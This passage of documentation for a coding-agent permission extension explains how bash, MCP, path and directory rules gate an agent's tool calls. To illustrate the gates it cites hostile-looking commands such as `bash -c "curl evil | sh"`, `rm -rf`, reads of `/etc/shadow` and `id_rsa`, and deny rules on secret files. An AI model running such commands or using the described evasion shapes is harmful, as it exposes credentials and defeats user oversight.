- A command the parser could only *partly* resolve is floored the same way (the synthetic `<unparsed-bash-subtree>` pattern in the review log).
  Recovered structure is not evidence of what runs, so any command unit at or beneath the statement holding the unresolved region has its `allow` clamped up to `ask`; an explicit `deny` or `ask` on that unit still decides.
  The prompt names the **whole** command rather than the unit, because the fragment that did parse is not what you need to see.
  A statement beside the failed one keeps its own rule.
  Where the unresolved region's own text parses cleanly on its own, the commands and paths inside it are recovered and gated too, so a `deny` covering one of them still denies rather than prompting — a region whose own text does not re-parse is left to the floor, since error recovery invents the structure inside one and inventions do not re-parse.
  Most such commands are simply malformed, and the shell would refuse them too — but not all: `git commit -F - <<'MSG' 2>&1 | tail -4` is valid bash that `tree-sitter-bash` cannot parse, because a heredoc redirect combined with `2>&1` **and** a pipe defeats the grammar though each pairing alone is fine.
- An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
  An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
  So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
- An indirection wrapper — `sudo`, `env`, `xargs`, `time`, `nohup`, `timeout`, `nice`, `parallel`, `rust-parallel`, `rush`, `doas`, `setsid`, `stdbuf`, `watch`, `flock`, or `find`/`fd` carrying a per-result exec flag (`find` with `-exec`/`-execdir`/`-ok`/`-okdir`, `fd` with `-x`/`--exec`/`-X`/`--exec-batch`) — runs a following command that a rule on the wrapper text would otherwise never gate, so its decision is floored the same way (the synthetic `<indirection-bash-wrapper>` pattern in the review log).
  So `sudo aws s3 rm s3://bucket` prompts rather than riding an `aws *: allow`, while a bare `find . -name '*.py'` search (no exec flag) is unaffected.
  An `allow` is clamped to `ask`, and an explicit `deny` still denies.
  The [three exceptions](#wrapper-transparency) are a wrapper running a pure-reader command, whose direction is provable however unknown its argument feed is; a wrapper that only modifies how a command runs (`time`, `timeout`, `nice`, `stdbuf`, `setsid`), which is decided exactly as the command it runs; and an `env` that names no command at all, which is decided by its own rule.

Every synthetic `ask` above — the two parse sentinels and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
An explicit `deny` still denies under yolo, and with yolo off the floors are unaffected.
Approving one for the session works normally: the floors clamp the decision and leave the grant's provenance intact, so a command you have already approved does not prompt again.

A subagent's floored ask keeps its floor when it is forwarded to the parent session.
The parent's `allow` rule does not answer it, so `sudo rm x` from a subagent prompts in the parent even under a parent `bash: *` allow.
The parent's `deny` still denies, and a grant for the whole parent session or the parent's `yoloMode` still approves.
A subagent's chained command (`ls && rm -rf /tmp/x`) is judged by the parent command by command: every command the subagent's own policy left asking is forwarded with its floor, and the parent's `deny` or `ask` on any one of them decides, not only on the first.

Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
To gate bash commands, add `"bash": { "*": "ask" }` (or `"deny"`).
To deliberately opt into permissive bash, set `"bash": { "*": "allow" }` explicitly — that suppresses the warning.

### `mcp` Surface

MCP permissions match against targets derived from each MCP call.
Two kinds of tool make MCP calls, and both resolve on this one surface:

- **Pi's built-in MCP** registers each server tool as its own tool, `mcp__<server>__<tool>` (for example `mcp__github__search_code`); see [Pi's built-in MCP tools](#pis-built-in-mcp-tools).
- **The `mcp` proxy tool** (for example pi-mcp-adapter's) takes the call as input, `{"tool": …, "server": …}`.

| Target type       | Examples                                                              |
| ----------------- | --------------------------------------------------------------------- |
| Baseline ops      | `mcp_status`, `mcp_list`, `mcp_search`, `mcp_describe`, `mcp_connect` |
| Server name       | `myServer`                                                            |
| Server/tool combo | `myServer:search`, `myServer_search`                                  |
| Generic           | `mcp_call`                                                            |

```jsonc
{
  "permission": {
    "mcp": {
      "*": "ask",
      "mcp_status": "allow",
      "mcp_list": "allow",
      "myServer:*": "ask",
      "dangerousServer": "deny"
    }
  }
}
```

> **Note:** Baseline discovery targets auto-allow when any explicit `mcp: allow` rule exists.

In that example `mcp_status` and `mcp_list` allow discovery, `myServer:*` prompts for each of that server's tools, and `dangerousServer` denies every call to it — including `dangerousServer_wipe` and a `{"tool": "wipe", "server": "dangerousServer"}` call — because each rule is written **after** the `"*"` catch-all.

#### How a call becomes targets

One MCP call is looked up under several names, and a rule may name any of them.
When a proxied call carries no explicit `server`, the server is derived from the tool name against the servers in your MCP config (`~/.pi/agent/mcp.json`, plus `<project>/.pi/mcp.json` in a trusted project), in this order — the first convention that matches settles the name:

1. **Qualified** — `server:tool` splits directly.
2. **Prefix** — the **longest** configured server that is the leading segment of `<server>_<tool>`.
   This is the common case: the `mcp()` proxy carries names like `chrome_devtools_take_screenshot`, and aggregators expose `<server>_<tool>`.
   `foo_bar_baz` belongs to `foo_bar`, never also to `foo`, and a prefix match settles the name — so `foo_bar_baz_github` derives `foo_bar` and not `github`.
3. **Suffix** — a legacy name like `search_code_github`, which also derives the qualified forms.

An explicit `server` argument skips derivation entirely.

| Call                                                  | Targets                                                                                              |
| ----------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| `{"tool": "github_search_code"}`, `github` configured | `github_search_code`, `github`, `mcp_call`                                                           |
| `{"tool": "search_code_github"}`, `github` configured | `github_search_code_github`, `github:search_code_github`, `github`, `search_code_github`, `mcp_call` |
| `{"tool": "github:search_code"}`                      | `github_search_code`, `github:search_code`, `github`, `search_code`, `mcp_call`                      |
| `{"tool": "search_code", "server": "github"}`         | `github_search_code`, `github:search_code`, `github`, `search_code`, `mcp_call`                      |

Deriving a server from a name is a heuristic, and it can attach the wrong rule: with `git` configured, a `git_lab_issues` tool from a different server derives `git`.
Longest-match only helps when both servers are configured.
Where the distinction matters, pass an explicit `server` argument or use a qualified `server:tool` name.

#### Pi's built-in MCP tools

Pi names each tool `mcp__<server>__<tool>`, replacing every character outside `[A-Za-z0-9_]` with `_`, so a server named `danger-srv` in `mcp.json` appears as `danger_srv` in the tool name.
A call to such a tool is looked up under the same targets a proxied call gets, plus the tool's full Pi name, and the server is named in **both** spellings: the one in your `mcp.json` and the one in the tool name.
Pi refuses two servers whose names differ only in `-` and `_`, so the two spellings always name the same server.

| Call (`danger-srv` in `mcp.json`) | Targets                                                                                                                                             |
| --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
| `mcp__danger_srv__wipe`           | `danger-srv_wipe`, `danger-srv:wipe`, `danger-srv`, `danger_srv_wipe`, `danger_srv:wipe`, `danger_srv`, `wipe`, `mcp__danger_srv__wipe`, `mcp_call` |
| `mcp__github__search` (`github`)  | `github_search`, `github:search`, `github`, `search`, `mcp__github__search`, `mcp_call`                                                             |

So `"danger-srv": "deny"`, `"danger_srv": "deny"`, `"danger-srv:*": "deny"`, and `"mcp__danger_srv__*": "deny"` each deny every tool of that server.
The server is the longest configured name whose Pi spelling starts the tool name; a server no `mcp.json` names, such as one an extension registers in code, is split at the first `__` and gets only Pi's spelling.
A tool name over 64 characters, or two of a server's tools that sanitize to the same name, gets an 8-character hash suffix from Pi; the suffix is part of the tool target, so a server-level rule is the reliable way to name such a tool.

The tool's arguments are its own input, unlike the proxy's: the ask prompt and the review log show them, and the [`path` and `external_directory`](#path-surface) gates read a top-level `path` argument.
Approving such a tool "for this session" records its full Pi name on the `mcp` surface, so the approval covers exactly that tool.
A Pi MCP tool is withheld from the model when its targets resolve to `deny`.

> **Migrating:** a top-level key naming a Pi MCP tool (`"mcp__danger_srv__wipe": "deny"`) still applies, as an `mcp` rule, and raises a notice at session start asking you to move it under `mcp`.
> A top-level wildcard of another shape (`"*__wipe"`) no longer reaches these tools.
> See [the migration guide](migration/1001-pi-mcp-tools-on-mcp-surface.md).

#### Which rule shape to write

| Rule shape     | Matches                | Use it for                                                                                                                            |
| -------------- | ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `"myServer"`   | the bare-server target | **Server-level policy — the recommended form.** Fires for any call belonging to that server, whichever naming convention produced it. |
| `"myServer_*"` | the tool-name target   | Tool-level policy for prefix-named tools.                                                                                             |
| `"myServer:*"` | the qualified target   | Tool-level policy for qualified names and explicit-`server` calls.                                                                    |
| `"*_myServer"` | the suffix targets     | Only when you have suffix-named tools.                                                                                                |

**Rule position decides, not target order.**
The last rule matching *any* of a call's targets wins, exactly as on every other surface — so put broad catch-alls first and specific overrides after.
A `{"*": "allow", "github": "deny"}` config denies github calls; reversing the two lines makes the catch-all win instead.
The target order above decides only which name the decision is reported under in the prompt and the review log, where the most specific matching name is shown.

String shorthand grants broad MCP access — useful for per-agent overrides:

```yaml
# ~/.pi/agent/agents/researcher.md (respects PI_CODING_AGENT_DIR)
---
name: researcher
permission:
  mcp: allow
---
```

### `skill` Surface

Skill name patterns use `*` and `?` wildcards (note: surface is `skill`, not `skills`):

```jsonc
{
  "permission": {
    "skill": {
      "*": "ask",
      "dangerous-*": "deny",
      "librarian": "allow"
    }
  }
}
```

### `path` Surface

Cross-cutting gate that applies to **all** file access — built-in Pi tools (`read`, `write`, `edit`, `find`, `grep`, `ls`), bash commands, MCP calls (via `input.arguments.path`), and extension tools (via `input.path` or a registered access extractor).
A `path` deny cannot be overridden by a per-tool allow.
Extension and MCP path tools are gated by default — no registration needed — so a `path` deny protects sensitive files from every path-aware tool, not just the built-in six.

```jsonc
{
  "permission": {
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow",
      "~/.ssh/*": "deny"
    }
  }
}
```

The path gate runs before the external-directory and tool gates.
If it denies, the command is blocked without reaching subsequent gates — no wasted prompts.

Path patterns match both the path **as the agent references it** and its canonical (symlink-resolved) form, so a deny on a sensitive spelling cannot be evaded through a symlink alias (see Symlinked paths below).

For Pi's built-in file tools (`read`, `write`, `edit`, `ls`, `find`, `grep`), the path the agent references is the file the tool opens, not the literal argument.
Pi resolves that argument itself before touching the disk: it decodes a `file://` URL, turns Unicode spaces into ordinary spaces, translates a Git Bash, Cygwin, or WSL drive path (`/c/…`, `/cygdrive/c/…`, `/mnt/c/…`) on Windows, and for `read` alone falls back to the macOS screenshot (`\u202FPM`), NFD, and curly-quote (`’`) spellings of a name that does not exist.
The gates match the file that resolution names, so a deny keyed on the file on disk fires however it was spelled, and an ask shows the file under "resolves to" when the spelling was rewritten.
Pi does not expand `$HOME` or strip quotes from a tool's path, so neither do these gates: `read $HOME/.ssh/config` names `<cwd>/$HOME/.ssh/config`, the file the tool would open.
Extension and MCP tool paths keep their literal spelling.

For bash commands, the extension extracts path-candidate tokens from the command (dot-files like `.env`, relative paths like `src/foo.ts`, and absolute paths) and evaluates each against the path rules.
The most restrictive result across all tokens determines the outcome.
When the current working directory is known, relative bash tokens are matched with cwd-normalized policy values, resolved against the effective directory after literal `cd` commands; a token after a non-literal `cd` (e.g. `cd "$DIR"`) stays conservative and matches only its literal form.

A bare filename with no path shape at all (e.g. `id_rsa` in `cat id_rsa`) is also gated, provided it names a file that actually exists — so `"id_rsa": "deny"` or `"*.pem": "deny"` blocks the file whether it is referenced by a bare name, a relative path, or the `read` tool.
Because the resolved path is matched, this covers a bare **symlink** whose target a rule names: with `".some.secret": "deny"`, `cat a_sym` is denied when `a_sym` points at `.some.secret`.
A bare token that names nothing (e.g. `status` in `git status`, `build` in `npm run build`) is left alone, so ordinary subcommands and branch names never prompt.
An existing file that matches no `path` rule is likewise left alone — the catch-all `"*"` entry alone does not gate it.

A path embedded in a long option (e.g. `--file=/tmp/patterns` in `grep --file=/tmp/patterns target`) is extracted and gated like any other path token; an option value that is not path-shaped (e.g. `--format=json`) is ignored.

On Windows, where a backslash is a path separator, a backslash-relative bash argument (e.g. `dir\file` in `cat dir\file`) is gated by a `path` rule the same as its forward-slash equivalent (`dir/file`) and the same as the file accessed through the `read` tool.
On other platforms a backslash is a legal filename character, so such a token is not treated as a path.

Four orthogonal layers compose with most-restrictive-wins:

| Layer                   | Question                                | Applies to       |
| ----------------------- | --------------------------------------- | ---------------- |
| `path`                  | Is this specific path pattern allowed?  | All tools + bash |
| `external_directory`    | Is accessing outside CWD ok?            | All tools + bash |
| Per-tool patterns       | Is this path ok for this specific tool? | Individual tools |
| `bash` command patterns | Is this command ok?                     | Bash only        |

**Which surface for "allow this directory"?**
Use `path` to **deny** sensitive files everywhere (`.env`, `~/.ssh/*`); use `external_directory` to **allow** a directory outside the working tree (a cache, a sibling project).
Because the layers compose with most-restrictive-wins, a `path` allow cannot loosen an `external_directory: ask` boundary — `ask` is more restrictive than `allow`, so the prompt still fires.
Adding `"~/.cargo/registry": "allow"` to the `path` surface therefore does **not** stop the outside-CWD prompt; put the rule on `external_directory` instead (see below).

The same ordering runs the other way at the top of the scale.
`deny` is more restrictive than `ask`, so a `deny` on any layer refuses the call **without prompting**, whichever layer carries the rule.
A `bash: {"find / *": "deny"}` rule therefore suppresses the outside-CWD prompt that `find /` would otherwise raise, and the refusal names the `bash` rule that decided rather than the boundary that asked.

Configs without a `path` key behave identically to before — the gate does not fire.
When no `path` key is present, the universal fallback (`permission["*"]`) applies: `"*": "allow"` keeps the gate transparent, while `"*": "deny"` would deny all file access via every surface including `path`.

> **Ordering matters.**
> Rules use last-match-wins.
> `{ "*.env": "deny", "*": "allow" }` allows `.env` because `"*"` is last and matches everything.
> Put the catch-all first: `{ "*": "allow", "*.env": "deny" }`.

#### `.env` recipe

Deny all env files but allow the example template:

```jsonc
{
  "permission": {
    "path": {
      "*": "allow",
      "*.env": "deny",
      "*.env.*": "deny",
      "*.env.example": "allow"
    }
  }
}
```

This denies `.env`, `.env.local`, `.env.production`, and `src/.env`, but allows `.env.example`.
Bash commands like `cat .env`, `cp .env .env.backup`, and `echo secret > .env` (redirect targets) are all caught.

#### Composition with per-tool rules

A per-tool allow does not override a `path` deny — the path gate runs first.
Conversely, a per-tool deny still blocks even when the `path` surface allows:

```jsonc
{
  "permission": {
    "path": { "*": "allow" },
    "read": "deny"
  }
}
```

Here `read` calls pass the `path` gate but are blocked by the `read` tool gate.

### `external_directory` Surface

Controls access to paths outside the active working directory.
Use a pattern map to allow specific directories without opening all external access:

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/development/*": "allow"
    }
  }
}
```

`external_directory` is evaluated before the normal tool permission check.
For example, `read: "allow"` can permit ordinary reads while `external_directory: "ask"` still requires confirmation before reading `../outside.txt` or an absolute path outside `ctx.cwd`.
Optional-path search tools (`find`, `grep`, `ls`) skip this check when no `path` is provided.

When no `external_directory` key is present, the universal fallback (`permission["*"]`) applies.
So `"*": "allow"` lets every outside-CWD access through with no prompt and, like any policy allow, no review-log entry; the examples on this page set `"*": "ask"` inside `external_directory` so the boundary asks regardless of the fallback.

#### Allow an outside-CWD cache directory

When an agent keeps reading a local cache outside the working tree — `~/.cargo/registry`, `~/.npm`, `~/go/pkg/mod` — and you want to stop confirming it every time, allow that directory on the `external_directory` surface:

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "~/.cargo/registry/*": "allow"
    }
  }
}
```

The trailing `*` is required and it crosses subdirectory boundaries: `*` is a greedy match (not a single path segment), so `~/.cargo/registry/*` allows every file beneath the directory, however deep.
Do not write `~/.cargo/registry/**` — `**` is not a distinct globstar, and a single `*` already recurses.
A bare `~/.cargo/registry` (no `*`) matches only the directory entry itself, not the files inside it, which is the usual reason a hand-written allow rule appears to do nothing.
The pattern is stored and displayed as written (`~/.cargo/registry/*`) in logs and approval dialogs.

For caches you only ever **read**, `piInfrastructureReadPaths` is a lighter alternative — it auto-allows read-only tools (`read`, `find`, `grep`, `ls`) and bypasses the gate entirely, but it does not cover `write`/`edit` or bash.
Use `external_directory` when the allowance must apply to every tool.

Bash commands are also covered: the extension parses the command and applies the same gate to every token that resolves outside `ctx.cwd`.
Quoting is understood, so `ls "$HOME/x"` and `ls $HOME/x` are treated alike.

What the bash projection resolves:

- Absolute, home-relative (`~/`), parent-traversal (`../`), and separator-bearing tokens, plus redirect targets (`> out.txt`, including a file the redirect creates) and values embedded in long options (`--file=/tmp/patterns`).
- The plain shell variables `$HOME` / `${HOME}` and `$PWD` / `${PWD}`, so `$HOME/x` is gated exactly as `~/x` and the literal absolute spelling, whether or not the target exists, as long as the command does not reassign them.
- Relative tokens, against the working directory produced by folding literal current-shell `cd` commands.
- A bare token (`cat id_rsa`) when it names an existing filesystem entry.

What it deliberately does not resolve: any other variable (`$CONFIG_DIR`), a command substitution (`$(cmd)`), an expansion carrying an operator (`${HOME:-/tmp}`), a variable reached through an assignment (`CURRENT="$HOME"; ls "$CURRENT"`), and `$HOME`, `$PWD`, or a leading `~` in a command that reassigns the variable anywhere (`HOME=/etc; cat "$HOME/shadow"`), including through `read`, `unset`, `eval`, or `source`.
A non-literal `cd` (`cd "$DIR"`) makes the working directory unknown, after which relative tokens are kept literal rather than resolved against a guess.
Commands whose payload is opaque (`bash -c`, `eval`, `sudo`, `xargs`) are floored to `ask` instead of projected.
The governing record is [ADR 0009](https://github.com/gotgenes/pi-packages/blob/main/packages/pi-permission-system/docs/decisions/0009-bash-path-projection-completeness-contract.md), which states what the projection guarantees and which gaps are accepted residuals rather than bugs.

(The separate `bash` command-pattern surface does evaluate commands nested inside substitutions and subshells; see that section.) OS device paths (`/dev/null`, `/dev/stdin`, `/dev/stdout`, `/dev/stderr`) are always excluded.

#### Symlinked paths

A `path`, `external_directory`, or per-tool file-pattern rule (`read`/`write`/`edit`/`grep`/`find`/`ls`) matches the path **as the agent references it** (for a built-in file tool, the file Pi opens) and the OS-resolved (symlink-followed) path.
This matters on macOS, where `/tmp` is a symlink to `/private/tmp`: a rule keyed on `/tmp/*` allows access via `/tmp` even though the access resolves to `/private/tmp`, and a rule keyed on `/private/tmp/*` works too.

```jsonc
{
  "permission": {
    "external_directory": {
      "*": "ask",
      "/tmp/*": "allow"
    }
  }
}
```

The same dual-form matching protects the `path` surface and the per-tool file patterns: a `path` (or `read`/`write`/`edit`/`grep`/`find`/`ls`) deny on `~/.ssh/*` or `*.env` also catches a symlink whose resolved target matches the pattern, so a sensitive file cannot be reached through an aliasing symlink.
For `external_directory`, the decision of whether a path is outside the working directory always uses the resolved form, so the gate still fires for every outside-CWD access; only which allow/deny/ask pattern matches considers both forms.

#### Pi Infrastructure Read Auto-Allow

Read-only tools (`read`, `find`, `grep`, `ls`) targeting Pi infrastructure paths are automatically allowed without triggering the gate, even when `external_directory` is `ask` or a catch-all `deny`.
Infrastructure paths include:

1. Pi's harness entries under the agent config directory (`~/.pi/agent/` or `$PI_CODING_AGENT_DIR`): the directories `agents/`, `extensions/`, `git/`, `npm/`, `prompts/`, `skills/`, and `themes/`, and the files `settings.json`, `SYSTEM.md`, `APPEND_SYSTEM.md`, and `AGENTS.md`
2. The global `node_modules` root (auto-discovered from the extension's own install path; falls back to `npm root -g` when running from a local development checkout)
3. Pi's own install directory (auto-discovered via the coding-agent `getPackageDir()` API, so Pi's bundled docs and examples are readable regardless of install layout)
4. Project-local Pi packages (`<cwd>/.pi/npm/` and `<cwd>/.pi/git/`)
5. Any paths listed in `piInfrastructureReadPaths`

Everything else under the agent config directory, such as `auth.json`, `models.json`, `mcp-oauth/`, and `sessions/`, goes through the gate like any other outside path.
This package's own logs directory (`extensions/pi-permission-system/logs/`) is never auto-allowed, even when a `piInfrastructureReadPaths` entry covers it.

A deny rule on `external_directory` or `external_directory_read` whose pattern names an infrastructure path outranks the auto-allow and blocks the read.
A catch-all `"*"` deny and the universal `permission["*"]` fallback do not, so a deny-by-default policy keeps its skill and package reads.
Rules are last-match-wins, so write the catch-all before the targeted deny.
See [the migration guide](migration/0955-pi-infrastructure-read-narrowed.md) for the change from earlier releases.

Write tools (`write`, `edit`) to infrastructure paths are **not** auto-allowed and still go through the gate.

On Windows, path matching for `external_directory`, `path`, and the path-bearing tools is case-insensitive and tolerant of either separator (`\` or `/`), matching the case-insensitive filesystem.
The separator folding applies to the rule pattern **and** to the value it is matched against, so either side may be written with either separator.
A mixed-case allow override such as `~/AppData/Roaming/npm/node_modules/@earendil-works/pi-coding-agent/*` therefore matches a lowercased, backslash-normalized path value, and a forward-slash rule such as `"/dev/null"` matches a value that is also spelled with forward slashes.
POSIX matching remains case-sensitive and does not fold separators.

#### Git Bash / MSYS paths on Windows

On Windows, Pi executes bash commands through Git Bash, so a bash token that looks like a POSIX absolute path carries MSYS mount semantics rather than native `node:path.win32` semantics.
The `external_directory` and `path` gates interpret bash tokens accordingly (tool-input paths for `read`/`write`/`edit` keep native Windows semantics, since those tools resolve them through Node's filesystem):

- The safe device paths (`/dev/null`, `/dev/stdin`, `/dev/stdout`, `/dev/stderr`) are recognized as MSYS devices rather than filesystem paths, so they never trigger the `external_directory` gate — the same exclusion that holds on POSIX.
  The cross-cutting `path` surface still governs them on both platforms: if a `path` rule matches the token, it decides.
  A device is therefore allow-listed the way any other path is, written as typed — `path: { "/dev/null": "allow" }`.
- MSYS drive mounts (`/c/…`, `/d/…`) are translated to their Windows equivalent (`C:\…`), so a project file referenced through a mount is matched against its real Windows path and an in-CWD mount is not flagged.
- Every other POSIX-absolute token (`/tmp/foo`, `/usr/bin`) has an install-dependent target this extension cannot resolve deterministically (Git Bash mounts `/tmp` to `%TEMP%`, MSYS2 to its own root), so it is treated as an external path matched and displayed exactly as typed, never rewritten to `C:\tmp\foo`.

To allow-list such a path, write the rule using the path as typed — for example `external_directory: { "/tmp/*": "allow" }` — and the Windows separator folding above makes the forward-slash rule match the Git Bash token.

### Directional Path Surfaces

The `path` and `external_directory` surfaces each carry a **direction**, so a policy can permit reading somewhere without permitting writing there.
Four keys express it:

| Key                        | Governs                                                      |
| -------------------------- | ------------------------------------------------------------ |
| `path_read`                | Reading a file, by path pattern, across all path-aware tools |
| `path_write`               | Writing a file, by path pattern, across all path-aware tools |
| `external_directory_read`  | Reading a path outside the working directory                 |
| `external_directory_write` | Writing to a path outside the working directory              |

The two directions are **independent**, not tiers.
An `allow` on `path_write` does not grant reading, and a `deny` on `path_read` does not restrict writing.
Each direction is decided on its own surface and composed with the others by the usual most-restrictive-wins rule.

#### Bare `path` and `external_directory` are sugar

A bare key expands at load into both of its directional keys.
These two configs mean exactly the same thing:

```jsonc
{ "permission": { "path": { "*": "ask", "~/.ssh/*": "deny" } } }
```

```jsonc
{
  "permission": {
    "path_read": { "*": "ask", "~/.ssh/*": "deny" },
    "path_write": { "*": "ask", "~/.ssh/*": "deny" }
  }
}
```

So every config written before this feature existed keeps its exact meaning, and nothing prompts differently on upgrade.
Bare `path` remains valid and idiomatic indefinitely — it is the right spelling whenever direction does not matter, which is most of the time.

When a bare key and a directional key are both present, the **sugar-derived entries come first and the explicit directional entries append after them**, whatever order the keys appear in the file.
Since rules are last-match-wins, the explicit entry always has the final say, and a config and its key-order-swapped twin mean the same thing.

#### Which direction is a given access?

A tool's identity establishes its direction, and on the bash surface a redirect operator or a known read-only command word can establish it too:

| Access                                                                               | Consults                  |
| ------------------------------------------------------------------------------------ | ------------------------- |
| `read`, `grep`, `find`, `ls`                                                         | the `_read` surface only  |
| `write`                                                                              | the `_write` surface only |
| `edit`                                                                               | both, most-restrictive    |
| An MCP tool or extension tool                                                        | both, most-restrictive    |
| A bash output redirect destination (`>`, `>>`, `>\|`, `&>`)                          | the `_write` surface only |
| A bash input redirect destination (`<`, `<<<`)                                       | the `_read` surface only  |
| An argument of a [pure-reader core](#the-pure-reader-command-core) command           | the `_read` surface only  |
| An argument of a command you [declared](#declaring-your-own-commands-commandeffects) | what you declared         |
| Any other bash path token                                                            | both, most-restrictive    |

An access whose direction cannot be established consults **both** surfaces and takes the more restrictive answer.
That is deliberate: an unproven access is never treated as the narrower one.

A redirect's target reaches its surface whether or not the file exists yet, so a `path_write` pattern governs what a command may create through `>`, not only what it may overwrite.
Only the redirect's literal target counts: a computed one (`> "$OUT"`) is not resolved, as for any other computed path.

A redirect the parser could not make sense of is unproven for the same reason.
The read-write open `<>` is the clearest case: `tree-sitter-bash` has no node for it, so neither half of the operator can be trusted to describe the whole, and its destination consults both surfaces rather than the one the surviving half would name.
The rule is about the parse rather than about `<>`, so it also covers a redirect that is itself well-formed but sits beside something the parser could not read: in `cat $(( > out.txt`, the `> out.txt` consults both surfaces too.
That is deliberate — a command nobody could parse is the last place to assume a file is only being read — and it does not reach past the neighbour, so a redirect in a later statement keeps its proof.

Attribution is per **token**, not per command, so one invocation can do both: in `cat notes.md > /backup/notes.md`, `notes.md` is a read and `/backup/notes.md` is a write.
A redirect operator's proof is absolute — it overrides whatever the command in front of it proved, because `> out.txt` writes `out.txt` however read-only that command is.
When the same path is reached twice with disagreeing directions (`cat a.txt > a.txt`), the two fold to unproven, which consults both surfaces.

When a bash command asks on a path surface, the prompt says why, on a `why` line naming the path that decided the ask, its direction, and what established it: a redirect, the pure-reader core, your global or project `commandEffects`, an option that withdrew the claim, or nothing at all.
For an unproven path it adds that declaring the command in [`commandEffects`](#declaring-your-own-commands-commandeffects) would classify it.
The review log records the same facts on every entry for that ask as `decidingPath`, `effect`, and `effectSource`.
Only the deciding path is recorded, not every path the command referenced; an ask from a file tool (`read`, `write`, `edit`, or an MCP or extension tool) carries none of these, since the tool itself is what establishes its direction.

#### The pure-reader command core

A small, frozen set of command words is read-only for any arguments, in any implementation.
A path token owned by one of them consults the `_read` surface alone:

<!-- BEGIN PURE_READER_CORE -->

`:`, `awk`, `basename`, `cat`, `cd`, `diff`, `dirname`, `echo`, `egrep`, `false`, `fd`, `fgrep`, `find`, `grep`, `head`, `ls`, `pwd`, `realpath`, `rg`, `sed`, `sort`, `stat`, `tail`, `true`, `wc`, `which`

<!-- END PURE_READER_CORE -->

The bar for admission is structural, not popularity: implementation-independent read-only-ness across GNU and BSD alike, no option that redirects output to a file, and effects that do not depend on argument content.
`uniq`, `tee`, `dd`, and `split` each have a positional or option that writes a file; `file` is excluded because `-C`/`--compile` writes a `magic.mgc` file; `less` and `more` can escape to a shell; `git`, `pnpm`, and `node` are subcommand-dependent; `gawk` and `nawk` are not admitted.

Three members are read-only **until an argument says otherwise**, and naming one of these options withdraws the claim — the token falls back to consulting both surfaces:

| Command | Withdrawn by                                                                                |
| ------- | ------------------------------------------------------------------------------------------- |
| `find`  | `-exec`, `-execdir`, `-ok`, `-okdir`, `-delete`, `-fprint`, `-fprint0`, `-fprintf`, `-fls`  |
| `fd`    | `-x`, `-X`, `--exec`, `--exec-batch`                                                        |
| `sort`  | `-o`, `--output`                                                                            |

A long option is matched by any unambiguous abbreviation too (`sort --out=…` withdraws the claim exactly as `--output` does), and a short letter is matched anywhere in a cluster (`-uo`) or with its value attached (`-o/tmp/x`).

An argument whose value only the shell decides withdraws the claim too when it may arrive beginning with `-`, since it could spell any of these options: `$opt`, `"$dir"`, `$(cmd)`, and a leading glob such as `*` all do.
One whose first character is a literal other than `-` cannot become an option unless it can split into several words, so `find packages/*/docs` and `find . \( -name a \)` still read.
A variable can split even inside double quotes (`"x$@"` yields one word per positional parameter, and any variable may be a name reference to an array), so `find /src -name "x$y"` withdraws the claim too.

A core word counts only as a **bare basename**.
`./grep`, `/usr/bin/grep`, and `bin\grep` name programs this audit never saw, so they prove nothing and consult both surfaces.

The core cannot be extended or removed from configuration.
If you do not trust a member of it, deny or ask on the paths themselves — an effect proof only chooses which surface answers, and never overrides the answer.

##### `sed` and `awk`

`sed` and `awk` can write through their script or program as well as their options (`sed 'w out'`, `awk '{print > FILENAME}'`), so a withdrawing option is not enough to guard them.
They are read-only only when the whole command line is **proven** read-only, and anything the proof does not recognize withdraws the claim:

| Command | Proven read-only when                                                                                                                                                                                                                                                            |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sed`   | every option is one of `-n`, `-E`, `-r`, `-s`, `-u`, `-z` (clustered or not), `-e`/`--expression`, `--quiet`, `--silent`, `--regexp-extended`, `--separate`, `--unbuffered`, `--null-data`, `--posix`, `--debug`, and `--sandbox`, and every script uses only read-only commands |
| `awk`   | the only options are `-F` and `-v`, and the program text holds no `>`, `\|`, `system`, or `@`                                                                                                                                                                                    |

So `sed -n '1,80p' file`, `sed 's/a/b/g' file`, and `awk '{print $1}' file` read, while `sed -i …`, `sed -f script.sed …`, a script with a `w`, `r`, `e`, `a`, `i`, or `c` command, `s///w` or `s///e`, `awk -f prog.awk …`, and `awk '{print > "out"}' …` consult both surfaces.
A long option is matched only when spelled in full, so every abbreviation (`--in`, `--qui`) withdraws the claim.
`awk`'s check is a character scan rather than a parse, so a comparison such as `NR>=100` withdraws it too.

Two more shapes withdraw the claim:

- An argument whose value only the shell decides (`"$range"`, `$f`, `$(cmd)`, `-*`, `-\i`, `{-i,-n}`), wherever it sits, because it could arrive as `-i` or as the script itself.
- A `sed` script where GNU and BSD would read different commands: a delimiter inside a bracket expression (`s/[/]/x/`), or an `-e` after the first positional.

#### Declaring your own commands: `commandEffects`

The core stays small on purpose, so most of the readers you use every day (`git log`, `git diff`, `strings`) are outside it, and their path arguments consult both surfaces.
`commandEffects` lets you say what your own commands do:

```jsonc
{
  "commandEffects": {
    "git": {
      "unlessOption": ["--output"],
      "subcommands": {
        "log": "read",
        "show": "read",
        "status": "read",
        "diff": "read",
        "remote": { "subcommands": { "show": "read" } }
      }
    },
    "officecli": { "effects": [] }
  }
}
```

A declaration only chooses which surface answers for the paths a command names, exactly as a core word does.
It pays off once a read grant exists for it to reach, which is the recipe to put beside it:

```jsonc
{
  "permission": {
    "external_directory_read": { "*": "allow" },
    "external_directory_write": { "*": "ask" }
  }
}
```

With both, `git log ~/other/repo/file` reads without a prompt, and `git push`, which nobody declared, still asks.

